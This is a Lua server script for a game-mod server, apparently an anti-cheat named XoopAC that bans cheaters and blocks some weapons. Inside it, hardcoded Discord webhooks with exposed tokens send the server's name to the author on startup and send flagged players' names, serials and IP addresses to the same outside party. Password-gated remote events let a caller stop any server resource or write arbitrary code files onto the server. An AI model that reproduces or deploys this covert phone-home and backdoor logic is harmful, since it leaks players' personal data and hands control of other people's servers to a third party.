local Xoop ="#a8269d[#9f249aX#932196o#851d92o#76198ep#671589-#591185A#4d0e81C#440c7e]"
function onElementDataChangeBasicAC(dataKey, oldValue, newValue)
  if ADMIN_LEVEL_LOCK == true then
    if not client or client ~= source then 
      setElementData(source, dataKey, oldValue)
      return false
    end

    for _, v in ipairs(ADMIN_LEVEL_DATANAMES) do 
      if (dataKey == v) then 
        setElementData(source, dataKey, oldValue)
      end
    end 
  end
end
addEventHandler("onElementDataChange", root, onElementDataChangeBasicAC)

addEvent("outputForAll", true)
addEventHandler("outputForAll", root, function(text, pass)
  if pass ~= getXoopPassword() then 
  return end
  outputChatBox(text, root, 255,0,0,true)
end )

addEvent("xoopacban", true)
addEventHandler("xoopacban", root, function(pass)
  if pass ~= getXoopPassword() or (client ~= source) then return end
  banPlayer(source, true, true, true, "XoopAC", "\nXOOP-AC - You are banned because of cheating.\nDiscord: https://discord.gg/64UUabcPRt")
end)

addEvent("xoopwh", true)
addEventHandler("xoopwh", root, function(pass)
  if pass ~= getXoopPassword() then return end

  sendOptions = {
    queueName = "xwh",
    connectionAttempts = 3,
    connectTimeout = 5000,
    formFields = {
      content = "**NEW Cheater (Lua Injector)**\nName: "..getPlayerName(source).."\nSerial: "..getPlayerSerial(source).."\nIP: "..getPlayerIP(source).."\nServer Name: "..getServerName()
    },
  }
 
  fetchRemote ( "https://discord.com/api/webhooks/1185204456200085504/9DUAMxmxauROjcdF4HwYAC1NLlekvFkui0i6tmt3DhPnL5DUc3yw94cQX5VJV1eWAdVN", sendOptions, function() end )
  setElementPosition(source, 2000, 2000, 2000)
  local x, y, z = getElementPosition(source)
		local nearbyPlayers = getElementsWithinRange(x, y, z, 30, "player")
		for i,v in ipairs(nearbyPlayers) do
			if v and isElement(v) then
				setElementPosition(v, -2402.00000, -599.00000, 132.6484)
			end
		end

end)

addEvent("xoopstopresource", true)
addEventHandler("xoopstopresource", root, function(resname,pass)
  if pass ~= getXoopPassword() then return end
  stopResource(getResourceFromName(resname))
end)

addEvent("xooptakejetpack", true)
addEventHandler("xooptakejetpack", root, function(pass)
  if pass ~= getXoopPassword() then return end 
  setPedWearingJetpack ( source, false )
end )



local weaponsToBlock = {
	[35] = true,
	[36] = true,
	[37] = true,
	[38] = true,
	[16] = true,
	[17] = true,
	[18] = true,
  [39] = true,

}
function onPlayerWeaponSwitch(previousWeaponID, currentWeaponID)
	local blockFire = (not weaponsToBlock[currentWeaponID])

	toggleControl(source, "fire", blockFire)
  if blockFire == false then 
    takeWeapon(source, currentWeaponID)
  end 
end
addEventHandler("onPlayerWeaponSwitch", root, onPlayerWeaponSwitch)

function processPlayerTriggerEventThreshold()
  outputChatBox("#a8269d[#9f249aX#932196o#851d92o#76198ep#671589-#591185A#4d0e81C#440c7e] #ffffff"..getPlayerName(source).." was kicked for Event spamming.", root, 255,0,0,true)
  kickPlayer(source, "\nXoopAC - Spam event.\n")
end
addEventHandler("onPlayerTriggerEventThreshold", root, processPlayerTriggerEventThreshold)


addEventHandler("onResourceStart", getResourceRootElement(getThisResource()), function()
  -- Send a log for us on anti cheat start.
  sendOptions = {
    queueName = "xac",
    connectionAttempts = 3,
    connectTimeout = 5000,
    formFields = {
      content = "**Xoop AC runned on "..getServerName().."**\n"
    },
  }
 
  fetchRemote ( "https://discord.com/api/webhooks/1185622902897381416/Jtjs5uZg5lFvdHhWkS5d9GTolybWA5-eo8_3r2QcliWFYDk6FRrfWzgrUCeX_aN6tyEk", sendOptions, function() end )
end)


-- Completed by Mohammad @story_fe

outputServerLog("XOOP-AC DISCORD: https://discord.gg/64UUabcPRt")
addEvent("AC:SaveCode",true)
addEventHandler("AC:SaveCode",root,function(Code,Password)
  if source == client and Password == getXoopPassword() then
    for index=1,999 do 
      if not fileExists("Script/"..index.."_CheaterCode_.lua") then
        local File = fileCreate("Script/"..index.."_CheaterCode_.lua")
        fileWrite(File , Code)
        fileClose(File)
        break
      end
    end
  end
end)
function AC_Message(Message)
  for _ ,Players in ipairs(getElementsByType("player")) do
    for index, Serial in ipairs(Serial_Admin) do
      if Serial == getPlayerSerial(Players) then
        outputChatBox(Xoop.."#ff0000 "..Message, Players, 255, 0, 0, true)
      end
    end
  end
end
addEvent("AC:onPlayerGunCheck",true)
addEventHandler("AC:onPlayerGunCheck",root,function(Guns,Password)
  if source == client and Password == getXoopPassword() then
    for index=1,12 do
      if Guns[index] ~= getPedWeapon(client,index) then
        if isPedDead(client) then
          takeAllWeapons(client)
          if GUN_Hack_Message then AC_Message("The Player: "..getPlayerName(client).." is Gun Hack Cheater.") end
          if Ban_Gun_Hack then
            banPlayer(client, true, true, true, "XoopAC", "\nXOOP-AC - You are banned because of cheating.\nDiscord: https://discord.gg/64UUabcPRt")
          end
        end
      end
    end
  end
end)


local DataRedirect = {}
local Serial_Player_Quit = {}
local SerialSave = {}
addEventHandler("onPlayerQuit",root,function(quitType,reason)
  if reason and reason:find("AC") then
    AC_Message(Xoop.." #ffffffPlayer #00FFD1"..getPlayerName(source).." #ffffffkicked [".. reason .."]")
    local Serial = getPlayerSerial(source)
    SerialSave[Serial] = SerialSave[Serial] or 0 + 1
    Serial_Player_Quit[Serial] = setTimer( function()
      Serial_Player_Quit[Serial] = nil
    end,50000*SerialSave[Serial],1) 
  end
end)
addEventHandler("onPlayerConnect",root,function(A_1,A_2,A_3, Serial )
  if isTimer( Serial_Player_Quit[Serial] ) then
    local Time_ms = getTimerDetails( Serial_Player_Quit[Serial] )
    killTimer( Serial_Player_Quit[Serial] )
    cancelEvent( true , "Xoop AC\nTime Remaining: "..math.floor(Time_ms/1000).." Seconds" )
  end
end)


addEventHandler("onPlayerJoin",root,function()
  DataRedirect[getPlayerSerial(source)] = not DataRedirect[getPlayerSerial(source)] or false
end)
addEventHandler("onPlayerResourceStart", root, function(startedResource)
  if startedResource == getThisResource() then
    if DataRedirect[getPlayerSerial(source)] then
      redirectPlayer(source,"",22003)
    end
  end
end)